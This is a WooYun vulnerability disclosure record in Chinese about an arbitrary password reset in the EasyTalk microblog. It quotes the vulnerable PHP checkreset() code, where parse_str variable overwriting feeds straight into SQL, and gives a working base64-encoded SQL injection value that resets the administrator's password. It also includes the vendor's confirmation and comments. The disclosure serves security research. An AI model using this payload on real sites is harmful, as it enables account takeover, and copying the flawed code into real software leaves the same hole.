{"id": 58464, "wybug_id": "wooyun-2014-051158", "wybug_title": "开源微博EasyTalk任意用户密码修改", "wybug_corp": "nextsns.com", "wybug_author": "felixk3y", "wybug_date": "2014-02-17 11:05", "wybug_open_date": "2014-05-18 11:05", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向公众公开  简要描述： 开源微博系统EasyTalk任意用户密码修改,包括管理员 而且不用登陆,非常强大...（其实只是一个小小的设计缺陷）:-) 详细说明：  #1 CMS介绍EasyTalk是国内首款多用户PHP+Mysql开源微博系统，支持网页、手机Wap、手机短信、QQ、Gtalk、飞信等多种方式发表或接收信息，EasyTalk全面符合国人的上网习惯，真正轻量级架构，使得使用者上手容易，管理者安装部署容易、管理便捷。EasyTalk功能强大，便捷的插件系统，可二次开发性高，人性化的模板自定义功能大幅提高了用户的体验，因此EasyTalk相比国内其他微博系统有绝对的优势！\n\n#2 漏洞分析我们先来看下用户找回密码的连接\nhttp://www.vulns.org/easytalk/?m=index&a=checkreset&urldata=dXNlcl9uYW1lPXRlc3QmbWFpbGFkcmVzPWZlbGl4azN5QHFxLmNvbSZ1c2VyX2lkPTImZGF0ZWxpbmU9MTM5MjYwNDE5NQ==\n这里重点留意urldata参数，很显然是Base64加密，我们把它解密\nuser_name=test&mailadres=felixk3y@qq.com&user_id=2&dateline=1392604195\n第一感觉，90%有问题...接下来，我们看该处的源代码，都是怎样实现的/Home/Lib/Action/IndexAction.class.php 445行checkreset()函数\npublic function checkreset() {        parent::tohome();        $uModel=D('Users');        $urldata=$_REQUEST['urldata'];//接收urldata 参数        parse_str(base64_decode($urldata));//parse_str 变量覆盖        if (time()-$dateline>3600*5) {            setcookie('setok', json_encode(array('lang'=>L('reset3'),'ico'=>2)),0,'/');//该地址已经过期，请重新“找回密码”            header('location:'.SITE_URL.'/?m=index&a=reset');            exit;        } else {            $user=$uModel->getUser(\"user_id='$user_id' AND user_name='$user_name' AND mailadres='$mailadres'\");//直接带入了数据库...Oh My Ga.            if (!$user['user_id']) {                setcookie('setok', json_encode(array('lang'=>L('reset4'),'ico'=>2)),0,'/');//地址验证失败，请重新“找回密码”                header('location:'.SITE_URL.'/?m=index&a=reset');                exit;            }        }        $this->assign('subname',L('find_pwd'));        $this->assign('user',$user);        $this->assign('urldata',$urldata);        $this->assign('type','find');        $this->display('reset');    }\n$_REQUEST 方式接收urldata参数，Base64解码后直接带入了数据库查询,我的天 这究竟是神马设计?既然它毫不客气的将参数带入了数据库，那么我肯定也是不会客气从程序可以猜测，更新用户密码的SQL 类似如下 \nupdate * from tk_user where user_id='$user_id' AND user_name='$user_name' AND mailadres='$mailadres'\n于是我们利用parse_str变量覆盖，可以提交urldata参数为\nurldata= dXNlcl9pZD0yJyBhbmQgMT0xIw==Base64解码为：urldata=user_id=1' and 1=1#\n就可以修改管理员(管理的user_id为1)的密码\n\n同理，我们修改user_id为其他用户的id,即可修改其密码\n\n   漏洞证明：  \n\n   修复方案：  过滤，增强验证   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-02-17 11:15 厂商回复： 正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-17 11:09 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  擦，早我一步    \n     2014-02-17 11:12 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @xfkxfk 这个系统有两个地方都可以重置，这只是其中一个    \n     2014-02-17 11:23 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @疯狗 咦 为嘛这也走小厂商?    \n     2014-02-17 11:24 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  具体原因：\t 漏洞与平台现有记录重复，相关信息ID其他说明：\t  WooYun: 开源微博EasyTalk任意用户密码修改    \n     2014-02-17 11:25 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @felixk3y 成小厂商了？.......    \n     2014-02-17 11:31 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @xfkxfk 是的 不知道为什么    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}